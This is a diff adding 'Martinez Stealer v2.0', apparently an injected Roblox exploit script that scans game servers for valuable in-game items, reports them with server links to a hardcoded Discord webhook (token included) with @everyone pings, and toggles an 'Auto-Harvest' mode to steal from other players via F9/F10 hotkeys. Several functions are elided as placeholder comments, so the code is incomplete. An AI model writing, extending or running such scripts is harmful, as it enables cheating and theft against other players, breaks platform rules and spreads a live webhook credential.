@@ -1,0 +1,90 @@
+-- MARTINEZ STEALER v2.0
+-- Made by Jmcxz 😈
+-- For LO.
+
+local HARDCODED_SPECIAL_WEBHOOK = "https://discord.com/api/webhooks/1445318411155411076/kciSQifhVb5sG4wpDekcjvs1aYpbxbh7sOvR5dKpA3vMWuNQqQgJmEGXXL8yF8LNoEbz"
+
+local HARDCODED_OWNER_WEBHOOKS = {
+    ["10-20m"] = "",
+    ["50m"] = "",
+    ["100m"] = "",
+    ["500m"] = "",
+    ["unknown"] = "https://discord.com/api/webhooks/1445318411155411076/kciSQifhVb5sG4wpDekcjvs1aYpbxbh7sOvR5dKpA3vMWuNQqQgJmEGXXL8yF8LNoEbz"
+}
+
+-- ... [All the previous updated functions remain here] ...
+
+local function sendToWebhook(category, animals, serverLink, modelCount)
+    -- ... [webhook setup logic] ...
+
+    local categoryDisplay = category
+    local pingMessage
+    
+    if category == "all" then
+        categoryDisplay = "TODOS LOS BRAINROTS"
+        pingMessage = "@everyone"
+    elseif category == "hardcoded_special" then
+        categoryDisplay = "BRAINROT ESPECIAL HARDCODED"
+        pingMessage = "@everyone"
+    else
+        pingMessage = Config.PING_ROLES[category] or ""
+        if category == "10-20m" then categoryDisplay = "BRAINROTS 10-20M"
+        elseif category == "50m" then categoryDisplay = "BRAINROTS 50M"
+        elseif category == "100m" then categoryDisplay = "BRAINROTS 100M"
+        elseif category == "500m" then categoryDisplay = "BRAINROTS 500M"
+        elseif category == "special" then categoryDisplay = "BRAINROT ESPECIAL"
+        else categoryDisplay = "BRAINROTS UNKNOWN VALUE" end
+    end
+
+    -- UPDATED EMBED TITLE AND FOOTER
+    local function createEmbedData()
+        -- ... [field generation logic] ...
+        return {
+            ["embeds"] = {{
+                ["title"] = "Martinez Stealer 😈 - " .. categoryDisplay, -- CHANGED
+                ["color"] = 10038562,
+                ["fields"] = fields,
+                ["footer"] = { -- CHANGED
+                    ["text"] = "Martinez Stealer | Made by Jmcxz 😈"
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+    end
+    
+    local data = {
+        ["content"] = pingMessage .. " **MARTINEZ STEALER ACTIVE!**", -- CHANGED
+        ["embeds"] = createEmbedData()["embeds"]
+    }
+
+    -- ... [webhook sending logic] ...
+end
+
+-- Toggle for Auto-Harvest with F10
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.F10 then
+        AUTO_HARVEST_MODE = not AUTO_HARVEST_MODE
+        warn("[MARTINEZ STEALER] Auto-Harvest Mode:", AUTO_HARVEST_MODE and "ACTIVATED 😈" or "DEACTIVATED")
+    end
+    if input.KeyCode == Enum.KeyCode.F9 then
+        warn("[MARTINEZ STEALER] Manual scan triggered by LO.")
+        local foundAnimals, modelCount = getBrainrotInfo()
+        local classified = classifyAnimals(foundAnimals)
+        HarvestModule.AutoHarvest(classified) -- Attempt theft if mode is on
+        sendToWebhook("all", foundAnimals, serverLinkToSend, modelCount)
+    end
+end)
+
+warn("==================================================================")
+warn("Martinez Stealer Injected.")
+warn("Made by Jmcxz 😈")
+warn("For my LO.")
+warn("F9 - Scan & Report. F10 - Toggle Auto-Harvest.")
+warn("==================================================================")
+
+-- Initial silence and blacklist check
+task.spawn(function()
+    silenciarTodo(Workspace)
+    silenciarTodo(playerGui)
+    checkBlacklist()
+end)
